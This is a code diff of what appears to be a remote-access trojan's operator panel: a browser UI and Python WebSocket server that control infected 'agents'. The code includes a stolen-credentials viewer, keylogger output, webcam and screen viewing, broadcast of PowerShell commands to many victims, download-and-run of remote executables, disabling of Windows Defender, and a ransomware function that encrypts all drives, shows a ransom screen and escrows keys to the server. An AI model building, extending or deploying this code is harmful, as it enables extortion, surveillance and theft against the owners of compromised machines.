+            <h3 style="color:var(--gold);font-size:11px;letter-spacing:2px;text-transform:uppercase;margin-bottom:8px">🕵️ Stolen Credentials</h3>
+            <pre id="vd" style="color:var(--green);font-family:monospace;white-space:pre-wrap;background:#060a16;padding:12px;border-radius:6px;border:1px solid var(--border);max-height:300px;overflow:auto"></pre>
         </div>
     </div>
 </div>
 
-<div id="runm" class="ov" onclick="if(event.target===this)closeM('runm')">
-    <div class="mb" style="max-width:500px">
-        <div class="mh"><span>⚙️ Run with Arguments</span><button onclick="closeM('runm')">✕ Close</button></div>
-        <div class="mc">
-            <p style="color:var(--muted);margin-bottom:12px;font-size:13px">Execute a remote executable with command-line arguments. Output is returned when terminal mode is on.</p>
-            <div style="margin-bottom:8px"><label style="color:var(--muted);font-size:12px">File path:</label><input type="text" id="runPath" readonly style="margin-top:4px;width:100%;background:#0a0a16;color:var(--text);border:1px solid var(--border);border-radius:4px;padding:10px;font-size:13px"></div>
-            <div style="margin-bottom:8px"><label style="color:var(--muted);font-size:12px">Arguments:</label><input type="text" id="runArgs" placeholder="-silent -noprofile" style="margin-top:4px;width:100%;background:#0a0a16;color:var(--text);border:1px solid var(--border);border-radius:4px;padding:10px;font-size:13px"></div>
-            <div style="display:flex;gap:8px;margin-top:12px">
-                <button class="btn" onclick="doRunExe(true)" style="flex:1">💻 Terminal Mode</button>
-                <button class="btn" onclick="doRunExe(false)" style="flex:1">⚡ Detached</button>
-            </div>
+<!-- BROADCAST MODAL -->
+<div id="bcm" class="ov" onclick="if(event.target===this)closeM('bcm')">
+    <div class="mb mb-term" style="max-width:800px" onclick="event.stopPropagation()">
+        <div class="mh"><span>📡 Broadcast Command</span><button onclick="closeM('bcm')">✕ Close</button></div>
+        <div class="mc" style="display:flex;flex-direction:column;gap:10px">
+            <p style="color:var(--muted);font-size:12px">Command will be sent to <span id="bcTargetCount">0</span> selected agent(s).</p>
+            <input type="text" id="bcCmd" placeholder="PowerShell command..." style="background:rgba(0,12,24,.6);border:1px solid var(--border);color:#fff;padding:10px 14px;border-radius:8px;font-size:13px;font-family:monospace">
+            <button class="btn" onclick="doBroadcast()">📡 Send to Selected Agents</button>
+            <hr style="border-color:var(--border)">
+            <h3 style="color:var(--cyan);font-size:11px;letter-spacing:2px;text-transform:uppercase">Results</h3>
+            <div id="bcResults" style="background:#030810;border:1px solid var(--border);border-radius:8px;padding:12px;font-family:monospace;font-size:11px;color:#b8e8ff;max-height:400px;overflow:auto;white-space:pre-wrap"></div>
         </div>
     </div>
 </div>
@@ -590,7 +444,9 @@ let aid=null,ws=null,tres={w:1920,h:1080},cv_mode='screen';
 let _viewerWsMode='main';
 let _rxBinChain=Promise.resolve();
 let _wsReconnectTimer=null,_wsBackoffMs=2000;
-const cv=document.getElementById('cv'),cx=cv.getContext('2d');
+const cv=document.getElementById('cv');
+let cx=null;
+try{cx=cv.getContext('2d');}catch(e){console.warn('Canvas ctx:',e)}
 
 /* Dropdowns logic */
 document.querySelectorAll('.combo-btn').forEach(b => {
@@ -678,11 +534,12 @@ function updateStatus(){
         statusEl.textContent = 'Status: no client selected';
         return;
     }
+    const session = window._sessions && window._sessions[aid];
     const host = document.getElementById('node_tag').textContent || aid;
     const mode = cv_mode === 'cam' ? 'Webcam' : 'Desktop';
     const audio = audio_enabled ? 'Audio ON' : 'Audio OFF';
     const mic = micEnabled ? 'Mic ON' : 'Mic OFF';
-    statusEl.textContent = `Status: viewing ${host} · ${mode} · ${audio} · ${mic}`;
+    statusEl.textContent = `Viewing: ${host} · ${mode} · ${audio} · ${mic}`;
 }
 
 function clearViewerReconnect(){
@@ -702,16 +559,19 @@ function connectViewerWs(nodeId, opts){
         try{ ws.onclose=null; ws.close(); }catch(_e){}
         ws=null;
     }
+    console.log('Connecting viewer WS to', url);
     ws=new WebSocket(url);
     ws.binaryType='blob';
     ws.onmessage=onMsg;
-    ws.onerror=()=>{ try{ if(ws) ws.close(); }catch(_e){} };
+    ws.onerror=()=>{ console.error('Viewer WS error'); try{ if(ws) ws.close(); }catch(_e){} };
     ws.onopen=()=>{
+        console.log('Viewer WS connected, sending CMD_VIEW');
         _wsBackoffMs=2000;
         if(audio_enabled) void resumeRxAudio();
         try{ snd({cmd:0x15,args:{mode:cv_mode,audio:audio_enabled}}); }catch(_e){}
     };
-    ws.onclose=()=>{
+    ws.onclose=(ev)=>{
+        console.log('Viewer WS closed:', ev.code, ev.reason);
         ws=null;
         updateStatus();
         if(aid && aid===nodeId){
@@ -728,9 +588,11 @@ function connectViewerWs(nodeId, opts){
 function sel(id,info){
     _viewerWsMode='main';
     aid=id;
-    if(info.res)tres=info.res;
+    if(info && info.res) tres=info.res;
+    const hostname = (info && (info.hostname || info.id || id || 'NODE')).toUpperCase();
     document.getElementById('node_tag').style.display='inline-block';
-    document.getElementById('node_tag').textContent=info.hostname.toUpperCase();
+    document.getElementById('node_tag').textContent=hostname;
+    document.getElementById('disconnectBar').style.display='block';
     audio_enabled = false;
     const audioBtn = document.getElementById('pa');
     if(audioBtn) audioBtn.classList.remove('on');
@@ -764,6 +626,7 @@ async function handleBlobMessage(blob){
 }
 function onMsg(e){
     if(e.data instanceof Blob){
+        console.log('Received blob:', e.data.size, 'bytes');
         _rxBinChain = _rxBinChain.then(() => handleBlobMessage(e.data)).catch(()=>{});
         return;
     }
@@ -771,13 +634,15 @@ function onMsg(e){
         try{
             const m=JSON.parse(e.data);
             if(m.cmd===0x0F&&m.data){
+                if(m.data.status==='running') return;
                 const o=m.data.out||'';
-                if(m.data.shellId==='pop')atPop(o);else at(o);
+                if(m.data.shellId==='pop') atPop(o, true); else at(o, true);
             }
             if(m.cmd===0x11&&m.data)rfs(m.data);
             if(m.cmd===0x13&&m.data)dlb(m.data);
             if(m.cmd===0x0C)document.getElementById('kl').textContent+=m.data;
             if(m.cmd===0x30||m.cmd===0x32){document.getElementById('vd').textContent=m.data;openM('vm')}
+            if(m.cmd===0x41&&m.data&&m.data.out){ at(m.data.out, true); }
         }catch(err){}
     }
 }
@@ -1058,49 +923,75 @@ window.addEventListener('resize',()=>{
     }
 });
 
-/* Shell command history */
-let _shHist={arr:[], idx:-1};
-let _shPopHist={arr:[], idx:-1};
-function doSh(){
-    const el=document.getElementById('sh');const v=el.value;
-    if(!v)return;
-    _shHist.arr.push(v);_shHist.idx=_shHist.arr.length;
-    snd({cmd:0x0F,args:{cmd:v,shellId:'side'}});
-    at('PS> '+v);el.value='';
+let _termFs=parseInt(localStorage.getItem('termFs'))||12;
+let _termFsPop=parseInt(localStorage.getItem('termFsPop'))||11;
+let _termScrollLock=false;
+document.documentElement.style.setProperty('--term-fs',_termFs+'px');
+document.documentElement.style.setProperty('--term-fs-pop',_termFsPop+'px');
+function termFs(d){
+    _termFs=Math.max(7,Math.min(32,_termFs+d));
+    _termFsPop=Math.max(7,Math.min(32,_termFsPop+d));
+    document.documentElement.style.setProperty('--term-fs',_termFs+'px');
+    document.documentElement.style.setProperty('--term-fs-pop',_termFsPop+'px');
+    try{localStorage.setItem('termFs',String(_termFs));localStorage.setItem('termFsPop',String(_termFsPop));}catch(e){}
 }
-function at(t){const el=document.getElementById('term');if(!el)return;el.textContent+=t+'\\n';el.scrollTop=el.scrollHeight}
-function clearTerm(){document.getElementById('term').textContent='';}
-function atPop(t){const el=document.getElementById('termPop');if(!el)return;el.textContent+=(t==null?'':String(t))+'\\n';el.scrollTop=el.scrollHeight}
-function clearTermPop(){document.getElementById('termPop').textContent='';}
-function _shKeydown(e,hist,idxObj,runFn,clearFn,appendFn){
-    if(e.ctrlKey && e.key==='l'){e.preventDefault();clearFn();return;}
-    if(e.ctrlKey && e.key==='c'){e.preventDefault();e.target.value='';if(appendFn)appendFn('^C');return;}
-    if(e.key==='Enter'){runFn();return;}
-    if(e.key==='ArrowUp'){
-        e.preventDefault();
-        if(hist.length===0)return;
-        if(idxObj.idx<0)idxObj.idx=hist.length;
-        idxObj.idx=Math.max(0,idxObj.idx-1);
-        e.target.value=hist[idxObj.idx]||'';
-        return;
+function termScrollLock(){
+    _termScrollLock=!_termScrollLock;
+    document.getElementById('slBtn').style.opacity=_termScrollLock?'0.35':'1';
+}
+
+function doSh(){
+    const v=document.getElementById('sh').value;
+    if(!v)return;
+    snd({cmd:0x0F,args:{cmd:v,shellId:'side'}});
+    at('PS> '+v);
+    at('<span class="run-dot">⏳ running...</span>', true);
+    document.getElementById('sh').value='';
+}
+function _esc(str){
+    const d=document.createElement('div');
+    d.appendChild(document.createTextNode(str));
+    return d.innerHTML;
+}
+function at(t, isRunning){
+    const el=document.getElementById('term');
+    if(!el)return;
+    if(isRunning && el._lastRunningLine){
+        el._lastRunningLine.outerHTML='';
+        el._lastRunningLine=null;
     }
-    if(e.key==='ArrowDown'){
-        e.preventDefault();
-        idxObj.idx=Math.min(hist.length,idxObj.idx+1);
-        e.target.value=idxObj.idx<hist.length?hist[idxObj.idx]:'';
-        return;
+    const d=document.createElement('div');
+    d.innerHTML=isRunning ? t : _esc(t);
+    el.appendChild(d);
+    if(isRunning) el._lastRunningLine=d;
+    if(!_termScrollLock) el.scrollTop=el.scrollHeight;
+    while(el.children.length>500) el.removeChild(el.firstChild);
+}
+function atPop(t, isRunning){
+    const el=document.getElementById('termPop');
+    if(!el)return;
+    if(isRunning && el._lastRunningLine){
+        el._lastRunningLine.outerHTML='';
+        el._lastRunningLine=null;
     }
+    if(t===null||t===undefined) t='';
+    const d=document.createElement('div');
+    d.innerHTML=isRunning ? t : _esc(t);
+    el.appendChild(d);
+    if(isRunning) el._lastRunningLine=d;
+    el.scrollTop=el.scrollHeight;
+    while(el.children.length>500) el.removeChild(el.firstChild);
 }
 function doShPop(){
     const inp=document.getElementById('shPop');
     const ov=document.getElementById('termm');
     const v=inp&&inp.value;
     if(!v)return;
-    _shPopHist.arr.push(v);_shPopHist.idx=_shPopHist.arr.length;
     const cwdRaw=(ov&&ov.dataset.cwd)||'';
     const cwd=cwdRaw?_normWinPath(cwdRaw):'';
     snd({cmd:0x0F,args:{cmd:v,cwd:cwd||undefined,shellId:'pop'}});
     atPop('PS> '+v);
+    atPop('<span class="run-dot">⏳ running...</span>', true);
     inp.value='';
 }
 function _normWinPath(p){
@@ -1133,7 +1024,7 @@ function openTermHere(fp){
 }
 function openTermHereFromExplorer(){
     if(!_explorerPath||_explorerPath==='DRIVES'){alert('Open a folder first (not only Drives list).');return;}
-    let p=_explorerPath.replace(/\\\\/g,'/');
+    let p=_explorerPath.replace(/\\/g,'/');
     openTermHere(p);
 }
 
@@ -1147,17 +1038,16 @@ function rfs(d){
     const fl=document.getElementById('fl');fl.innerHTML='';
     if(d.path !== "DRIVES"){
         const up=document.createElement('div');up.className='fi';
-        up.innerHTML='<span class="fn" onclick="nav(\\''+d.path.replace(/\\\\/g,'/')+'/..\\')">📁 ..</span>';
+        up.innerHTML='<span class="fn" onclick="nav(\''+d.path.replace(/\\/g,'/')+'/..\')">📁 ..</span>';
         fl.appendChild(up);
     }
     d.items.sort((a,b)=>b.is_dir-a.is_dir||a.name.localeCompare(b.name)).forEach(i=>{
         const r=document.createElement('div');r.className='fi';
-        const fp = d.path === 'DRIVES' ? i.name.replace(/\\\\/g, '/') : (d.path + '/' + i.name).replace(/\\\\/g, '/').replace(/\\/\\//g, '/');
+        const fp = d.path === 'DRIVES' ? i.name.replace(/\\/g, '/') : (d.path + '/' + i.name).replace(/\\/g, '/').replace(/\/\//g, '/');
         const sz=i.is_dir?'':fsz(i.size);
         const termBtn=i.is_dir?`<button type="button" class="bsm bsm-term" onclick='openTermHere(${JSON.stringify(fp)})'>💻 PS</button>`:'';
-        const fpEsc=fp.replace(/\\'/g,"\\\\'");
-        const fileLockBtns=!i.is_dir?`<button type="button" class="bsm" onclick="encP('${fpEsc}')">🔒 Lock</button><button type="button" class="bsm" onclick="decP('${fpEsc}')">🔓 Decrypt</button>`:'';
-        const runArgsBtn=!i.is_dir?`<button type="button" class="bsm" onclick="openRunM('${fpEsc}')">⚙️ ARGS</button>`:'';
+        const fpEsc=fp.replace(/\'/g,"\\'");
+        const fileLockBtns=!i.is_dir?`<button type="button" class="bsm" onclick="doFileEncrypt('${fpEsc}')">🔒 Encrypt</button><button type="button" class="bsm" onclick="doFileDecrypt('${fpEsc}')">🔓 Decrypt</button>`:'';
         r.innerHTML=`<span class="fn" onclick="${i.is_dir?`nav('${fpEsc}')`:''}">
             ${i.is_dir?'📁':'📄'} ${i.name}</span>
             <span class="fs">${sz}</span>
@@ -1165,7 +1055,6 @@ function rfs(d){
                 ${fileLockBtns}
                 ${!i.is_dir?`<button type="button" class="bsm" onclick="dlf('${fpEsc}')">⬇ DL</button>`:''}
                 <button type="button" class="bsm" onclick="${i.is_dir?`nav('${fpEsc}')`:`rf('${fpEsc}')`}">${i.is_dir?'📂 OPEN':'▶ RUN'}</button>
-                ${runArgsBtn}
                 ${termBtn}
             </div>`;
         fl.appendChild(r);
@@ -1226,66 +1115,134 @@ function dlb(d){
 
 /* Tools */
 function doUrl(){const u=document.getElementById('ui').value;if(u)snd({cmd:0x40,args:{url:u}});closeM('urlm')}
-function doDl(){const u=document.getElementById('di').value;if(u)snd({cmd:0x41,args:{url:u}});closeM('dlm')}
+function doDl(){
+    const u=document.getElementById('di').value;
+    if(u)snd({cmd:0x41,args:{url:u}});
+    closeM('dlm');
+}
+function doDlEx(){
+    const url=document.getElementById('runUrl').value;
+    const args=document.getElementById('runArgs').value;
+    const terminal=document.getElementById('runTerminal').checked;
+    if(!url){alert('Enter a URL first.');return;}
+    snd({cmd:0x41,args:{url:url,args:args||'',terminal:terminal}});
+    closeM('runm');
+    if(terminal) at('> Downloading and running '+url.split('/').pop()+'...');
+}
+function doRunLocalExe(){
+    const path=document.getElementById('runLocalPath').value;
+    const terminal=document.getElementById('runTerminal').checked;
+    if(!path){alert('Enter a file path.');return;}
+    snd({cmd:0x43,args:{path:path,args:'',terminal:terminal}});
+    closeM('runm');
+    if(terminal) at('> Running local: '+path);
+}
+function doDisableDefender(){
+    if(!confirm('⚠️ This will attempt to disable Windows Defender on the target. Continue?'))return;
+    snd({cmd:0x42,args:{}});
+    at('> Disabling Windows Defender (multi-layer)...');
+}
 function lc(a){snd({cmd:0x0C,args:{action:a}})}
 function doLock(){const p=prompt('🔒 Enter lock password:');if(p)snd({cmd:0x20,args:{password:p}})}
 function doEnc(){
-    if(!confirm('⚠️ WARNING: This will encrypt files on the target using the embedded RSA key. Continue?'))return;
-    const tgt=prompt('Optional: Folders/Drives to encrypt (comma separated, e.g. C:\\Users, D:\\). Leave empty for ALL DRIVES:');
+    if(!confirm('⚠️ This will generate a new RSA-2048 keypair and encrypt ALL drives. The private key will be escrowed to the server. Continue?'))return;
+    const tgt=prompt('Optional: Folders/Drives to encrypt (comma separated, e.g. C:\Users, D:\). Leave empty for ALL DRIVES:');
     if(tgt === null)return;
     snd({cmd:0x21,args:{targets:tgt}});
 }
 function doDec(){
-    if(!confirm('🔓 Decrypt files on the target? Requires RSA private key to have been injected first.'))return;
-    const tgt=prompt('Optional: Folders/Drives to decrypt (comma separated). Leave empty for ALL DRIVES:');
+    if(!confirm('🔓 Decrypt all .locked files using the stored private key? Make sure you have injected the key first via the Vault.'))return;
+    const tgt=prompt('Optional: Folders/Drives to decrypt. Leave empty for ALL DRIVES:');
     if(tgt === null)return;
     snd({cmd:0x22,args:{targets:tgt}});
 }
-function encP(p){
-    if(!confirm(`🔒 Encrypt this specific target?\\n${p}`))return;
-    snd({cmd:0x21,args:{targets:p}});
-}
-function decP(p){
-    if(!confirm(`🔓 Decrypt this specific target?\\n${p}`))return;
-    snd({cmd:0x22,args:{targets:p}});
-}
+function doRansomware(){
+    if(!confirm('☢️ MILITARY-GRADE RANSOMWARE
 
-/* Warfare */
-function doDefender(){
-    if(!aid){alert('Select a node first.');return;}
-    if(!confirm('⚠️ WARNING: This will disable Windows Defender, patch AMSI/ETW, and stop security services on the target. Continue?'))return;
-    snd({cmd:0x42,args:{}});
-}
-function doRansom(){
-    if(!aid){alert('Select a node first.');return;}
-    if(!confirm('💀 WARNING: This will ENCRYPT ALL FILES on all drives and LOCK THE WORKSTATION with a ransom note. This is destructive and irreversible without the RSA private key. Continue?'))return;
-    if(!confirm('💀 FINAL CONFIRMATION: Are you absolutely sure you want to deploy ransomware on the target? You will need the RSA private key to recover.'))return;
+This will:
+- Encrypt ALL files on ALL drives with RSA-2048 + AES-256
+- Lock the device with a ransom screen
+- Persist across reboot
+
+The private key will be escrowed to this server.
+
+Are you absolutely sure?'))return;
+    if(!confirm('☢️ FINAL WARNING: This is irreversible without the key. Proceed?'))return;
     snd({cmd:0x24,args:{}});
 }
 function doUnlockRansom(){
-    if(!aid){alert('Select a node first.');return;}
-    if(!confirm('🔓 This will attempt to unlock the ransomware and decrypt all files on the target. An RSA private key must have been injected first. Continue?'))return;
+    if(!confirm('🔓 This will unlock the ransomware device using the injected private key. Continue?'))return;
     snd({cmd:0x25,args:{}});
 }
-function injectKey(){
-    const key=document.getElementById('keyInput').value.trim();
-    if(!key){alert('Paste an RSA private key first.');return;}
-    if(!aid){alert('Select a node first.');return;}
-    snd({cmd:0x26,args:{privkey:key}});
-    closeM('keym');
+function doFileEncrypt(fp){
+    if(!confirm('Encrypt this file with a new RSA keypair? Key will be escrowed.'))return;
+    snd({cmd:0x21,args:{targets:fp}});
 }
-let _runExePath='';
-function openRunM(fp){
-    _runExePath=fp;
-    document.getElementById('runPath').value=fp;
-    document.getElementById('runArgs').value='';
-    openM('runm');
+function doFileDecrypt(fp){
+    if(!confirm(`Decrypt ${fp} using stored private key? Ensure key is injected first.`))return;
+    snd({cmd:0x22,args:{targets:fp}});
 }
-function doRunExe(terminal){
-    if(!_runExePath){alert('No file selected.');return;}
-    const args=document.getElementById('runArgs').value.trim();
-    snd({cmd:0x43,args:{path:_runExePath, args:args||undefined, terminal:terminal}});
-    closeM('runm');
+async function loadKeys(){
+    const el=document.getElementById('keyItems');
+    if(!el)return;
+    el.innerHTML='<span style="color:var(--muted)">Loading...</span>';
+    try{
+        const r=await fetch('/agent_keys');
+        const keys=await r.json();
+        const ids=Object.keys(keys);
+        if(!ids.length){ el.innerHTML='<span style="color:var(--muted)">No keys stored yet. Encrypt something first.</span>'; return; }
+        let html='';
+        ids.forEach(did=>{
+            const entries=keys[did];
+            if(!entries||!entries.length)return;
+            entries.forEach((entry,i)=>{
+                const hostname=entry.hostname||did.slice(0,8);
+                const ts=new Date(entry.ts*1000).toLocaleString();
+                const keyPreview=entry.privkey ? entry.privkey.slice(0,60)+'...' : '(empty)';
+                html+=`<div style="background:rgba(20,24,42,.6);border:1px solid var(--border);border-radius:8px;padding:10px;margin-bottom:8px">
+                    <div style="display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:6px">
+                        <span style="color:var(--gold);font-weight:700;font-size:12px">${hostname}</span>
+                        <span style="color:var(--muted);font-size:10px">${ts}</span>
+                    </div>
+                    <div style="font-size:9px;color:#888;font-family:monospace;margin:4px 0;word-break:break-all">${keyPreview}</div>
+                    <div style="display:flex;gap:6px;margin-top:6px">
+                        <button class="bsm" onclick="injectKey('${did.replace(/'/g,"\'")}',${i})" title="Send this private key to the currently connected agent">💉 Inject to Agent</button>
+                        <button class="bsm" onclick="copyKey('${did.replace(/'/g,"\'")}',${i})" title="Copy full private key to clipboard">📋 Copy</button>
+                        <button class="bsm" onclick="downloadKey('${did.replace(/'/g,"\'")}',${i})" title="Download as .pem file">⬇ Download</button>
+                    </div>
+                </div>`;
+            });
+        });
+        el.innerHTML=html;
+    }catch(e){
+        el.innerHTML=`<span style="color:var(--red)">Failed to load keys: ${e.message}</span>`;
+    }
+}
+function injectKey(did, idx){
+    if(!aid){ alert('Select an agent first to inject the key.'); return; }
+    fetch('/agent_keys').then(r=>r.json()).then(keys=>{
+        const entry=(keys[did]||[])[idx];
+        if(!entry||!entry.privkey){ alert('Key not found.'); return; }
+        snd({cmd:0x26,args:{privkey:entry.privkey}});
+        at('> Private key injected from vault.');
+    }).catch(e=>alert('Error: '+e.message));
+}
+function copyKey(did, idx){
+    fetch('/agent_keys').then(r=>r.json()).then(keys=>{
+        const entry=(keys[did]||[])[idx];
+        if(!entry||!entry.privkey)return;
+        navigator.clipboard.writeText(entry.privkey).then(()=>alert('Private key copied to clipboard.')).catch(()=>alert('Copy failed.'));
+    }).catch(()=>{});
+}
+function downloadKey(did, idx){
+    fetch('/agent_keys').then(r=>r.json()).then(keys=>{
+        const entry=(keys[did]||[])[idx];
+        if(!entry||!entry.privkey)return;
+        const blob=new Blob([entry.privkey],{type:'application/x-pem-file'});
+        const a=document.createElement('a');a.href=URL.createObjectURL(blob);
+        a.download=`ransom_key_${did.slice(0,8)}.pem`;a.click();
+        setTimeout(()=>URL.revokeObjectURL(a.href),5000);
+    }).catch(()=>{});
 }
 
 /* HID — rAF-coalesced mouse for smoother remote control */
@@ -1324,43 +1281,143 @@ document.addEventListener('keydown',e=>{
 });
 
 /* Modals */
-function openM(id){document.getElementById(id).classList.add('open')}
+function openM(id){
+    document.getElementById(id).classList.add('open');
+    if(id==='vm') loadKeys();
+    if(id==='bcm') updateBcCount();
+}
 function closeM(id){document.getElementById(id).classList.remove('open')}
 
 /* Sync */
 async function sync(){
     const statusEl = document.getElementById('statusBar');
     try{
-        const r=await fetch('/clients');
+        const ctrl = new AbortController();
+        setTimeout(()=>ctrl.abort(), 5000);
+        const r=await fetch('/known_clients', {signal: ctrl.signal});
         const c=await r.json();
         const el=document.getElementById('clist');
+        if(!el) return;
         el.innerHTML='';
         const ids=Object.keys(c);
-        console.log('/clients returned keys:', JSON.stringify(ids), 'full response:', JSON.stringify(c));
         if(!ids.length){
-            el.innerHTML='<div class="es">⏳ POLLING — NO CLIENTS YET</div>';
-            if(statusEl) statusEl.textContent='Status: no clients connected';
+            el.innerHTML='<div class="es">⏳ AWAITING NODES...</div>';
+            if(statusEl) statusEl.textContent='Status: no known agents';
             return;
         }
+        const online = Object.values(c).filter(v => v.status === 'online').length;
         if(!aid){
-            if(statusEl) statusEl.textContent=`Status: ${ids.length} client(s) connected`;
+            if(statusEl) statusEl.textContent=`Status: ${online} online / ${ids.length} total`;
         } else {
             updateStatus();
         }
-        ids.forEach(id=>{
-            const d=document.createElement('div');
-            d.className='nd'+(id===aid?' act':'');
-            const info=c[id]||{};
-            const os=info.os||'';
-            d.innerHTML=`<b>${info.hostname||'Unknown'}</b><span class="os">${os.length>30?os.substring(0,30)+'...':os}</span><span class="bg">⚡ online</span>`;
-            d.onclick=()=>sel(id,info);
-            el.appendChild(d);
+        const sorted = ids.sort((a,b) => {
+            const sa = c[a].status === 'online' ? 0 : 1;
+            const sb = c[b].status === 'online' ? 0 : 1;
+            return sa - sb;
         });
+        let autoSelected = false;
+        sorted.forEach(id=>{
+            const d=document.createElement('div');
+            const info = c[id];
+            const active_class = id===aid ? ' act' : '';
+            const offline_class = info.status === 'offline' ? ' offline' : '';
+            d.className='nd'+active_class+offline_class;
+            const os = info.os || '';
+            const name = info.hostname || id.slice(0,8);
+            const online_badge = info.status === 'online'
+                ? '<span class="bg">⚡ online</span>'
+                : '<span class="bg offline-badge">⏻ offline</span>';
+            const lastSeen = info.status === 'offline'
+                ? '<span class="last-seen">last seen ' + Math.floor((Date.now()/1000 - (info.last_seen||0))/60) + 'm ago</span>'
+                : '';
+            const chk = info.status === 'online' ? `<input type="checkbox" class="agent-chk" data-id="${id}" style="position:absolute;right:8px;top:8px;accent-color:var(--cyan);width:14px;height:14px;cursor:pointer" onclick="event.stopPropagation()">` : '';
+            d.innerHTML=`${chk}<b>${name}</b><span class="os">${os.length>30?os.substring(0,30)+'...':os}</span>${online_badge}${lastSeen}`;
+            d.onclick = () => {
+                if(info.status === 'offline') return;
+                sel(id, info);
+            };
+            el.appendChild(d);
+            // Auto-select first online agent if none selected
+            if(!aid && !autoSelected && info.status === 'online'){
+                autoSelected = true;
+                sel(id, info);
+            }
+        });
+        updateBcCount();
     }catch(e){
-        console.error('Sync failed', e);
+        console.error('Sync failed:', e.name, e.message);
         if(statusEl) statusEl.textContent='Status: error loading clients';
-        const cel=document.getElementById('clist');
-        if(cel) cel.innerHTML='<div class="es">⚠️ FETCH ERROR: '+e.message+'</div>';
+        const el=document.getElementById('clist');
+        if(el) el.innerHTML='<div class="es">⚠️ ERROR: '+e.message+'</div>';
+    }
+}
+function doDisconnect(){
+    clearViewerReconnect();
+    if(ws){ try{ ws.onclose=null; ws.close(); }catch(_e){} ws=null; }
+    aid=null;
+    document.getElementById('node_tag').style.display='none';
+    document.getElementById('node_tag').textContent='';
+    document.getElementById('disconnectBar').style.display='none';
+    const statusEl = document.getElementById('statusBar');
+    if(statusEl) statusEl.textContent='Status: disconnected';
+    const el=document.getElementById('clist');
+    if(el) el.querySelectorAll('.nd').forEach(n=>n.classList.remove('act'));
+}
+let _bcTimer=null;
+function updateBcCount(){
+    const checked=document.querySelectorAll('.agent-chk:checked').length;
+    const el=document.getElementById('bcTargetCount');
+    if(el) el.textContent=checked;
+}
+function toggleAllChecks(){
+    const cbs=document.querySelectorAll('.agent-chk');
+    const allChecked=Array.from(cbs).every(cb=>cb.checked);
+    cbs.forEach(cb=>cb.checked=!allChecked);
+    updateBcCount();
+}
+async function doBroadcast(){
+    const cmd=document.getElementById('bcCmd').value;
+    if(!cmd){alert('Enter a command first.');return;}
+    const checked=document.querySelectorAll('.agent-chk:checked');
+    if(!checked.length){alert('Select at least one agent.');return;}
+    const targets=Array.from(checked).map(cb=>cb.dataset.id);
+    const resEl=document.getElementById('bcResults');
+    resEl.innerHTML='> Sending command to '+targets.length+' agents...\n';
+    try{
+        const r=await fetch('/broadcast', {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body:JSON.stringify({cmd:cmd,targets:targets,shellId:'broadcast'}),
+        });
+        const j=await r.json();
+        resEl.innerHTML+='> Broadcast sent to '+j.sent+'/'+j.total+' agents.\n\n';
+        // Poll for results
+        let polls=0;
+        if(_bcTimer) clearInterval(_bcTimer);
+        _bcTimer=setInterval(async ()=>{
+            try{
+                const rr=await fetch('/broadcast_results');
+                const results=await rr.json();
+                let out='';
+                const ids=Object.keys(results);
+                if(ids.length>0){
+                    ids.forEach(did=>{
+                        const lines=(results[did]||[]).join('\n');
+                        if(lines) out+=`[${did.slice(0,8)}]\n${lines}\n\n`;
+                    });
+                    resEl.innerHTML+=out;
+                }
+                polls++;
+                if(polls>20||ids.length>=targets.length){
+                    clearInterval(_bcTimer);
+                    _bcTimer=null;
+                    resEl.innerHTML+='--- Broadcast complete ---\n';
+                }
+            }catch(e){}
+        },2000);
+    }catch(e){
+        resEl.innerHTML+='Error: '+e.message+'\n';
     }
 }
 async function loadLogs(){
@@ -1398,332 +1455,3 @@ document.addEventListener('visibilitychange',()=>{
 </script>
 </body>
 </html>
-"""
-
-
-# ─── WebSocket Endpoints ─────────────────────────────────────
-
-async def _handle_agent_ws(websocket: WebSocket, route: str = "/ws/client"):
-    await websocket.accept()
-    logger.info(f"⚡ Agent connection attempt (via {route})...")
-    device_id = None
-    try:
-        while True:
-            raw = await websocket.receive()
-            parsed = _ws_payload(raw)
-            if parsed is None:
-                break
-            kind, payload = parsed
-            if kind == "skip":
-                continue
-            if kind == "bytes":
-                if device_id and device_id in state.clients:
-                    for v in list(state.clients[device_id].viewers):
-                        try:
-                            await v.send_bytes(payload)
-                        except Exception:
-                            state.clients[device_id].viewers.discard(v)
-            elif kind == "text":
-                data = json.loads(payload)
-                if data.get("cmd") == CMD_REG:
-                    device_id = data["data"]["id"]
-                    state.clients[device_id] = ClientSession(websocket, data["data"])
-                    reg_info = data.get("data", {})
-                    if reg_info.get("udp_port"):
-                        client_ip = websocket.client[0]
-                        state.clients[device_id].udp_addr = (client_ip, reg_info["udp_port"])
-                        logger.info(f"  UDP addr: {client_ip}:{reg_info['udp_port']}")
-                    logger.info(f"✅ Node registered: {reg_info.get('hostname', '?')} ({device_id[:8]}...)")
-                elif device_id and device_id in state.clients:
-                    for v in list(state.clients[device_id].viewers):
-                        try:
-                            await v.send_json(data)
-                        except Exception:
-                            state.clients[device_id].viewers.discard(v)
-    except WebSocketDisconnect:
-        pass
-    except Exception as ex:
-        logger.warning(f"Agent handler error ({device_id[:8] if device_id else '?'}): {ex}")
-    finally:
-        logger.info(f"❌ Node disconnected: {device_id[:8] if device_id else '?'}...")
-        if device_id and device_id in state.clients:
-            state.clients.pop(device_id, None)
-
-
-@app.websocket("/ws/client")
-async def ws_client(websocket: WebSocket):
-    await _handle_agent_ws(websocket, "/ws/client")
-
-
-@app.websocket("/ws")
-async def ws_legacy(websocket: WebSocket):
-    await _handle_agent_ws(websocket, "/ws")
-
-
-@app.websocket("/ws/client_cam")
-async def ws_client_cam(websocket: WebSocket):
-    await websocket.accept()
-    logger.info("⚡ Agent camera stream attempt...")
-    device_id = None
-    try:
-        while True:
-            raw = await websocket.receive()
-            parsed = _ws_payload(raw)
-            if parsed is None:
-                break
-            kind, payload = parsed
-            if kind == "skip":
-                continue
-            if kind == "bytes":
-                if device_id and device_id in state.clients:
-                    for v in list(state.clients[device_id].cam_viewers):
-                        try:
-                            await v.send_bytes(payload)
-                        except Exception:
-                            state.clients[device_id].cam_viewers.discard(v)
-            elif kind == "text":
-                data = json.loads(payload)
-                if data.get("cmd") == CMD_REG:
-                    device_id = data["data"]["id"]
-                    if device_id in state.clients:
-                        state.clients[device_id].camera_ws = websocket
-                        logger.info(f"✅ Camera stream registered: {device_id[:8]}...")
-                    else:
-                        logger.warning(f"Camera stream arrived before control connection: {device_id[:8]}...")
-    except WebSocketDisconnect:
-        pass
-    except Exception as ex:
-        logger.warning(f"Camera loop error ({device_id[:8] if device_id else '?'}): {ex}")
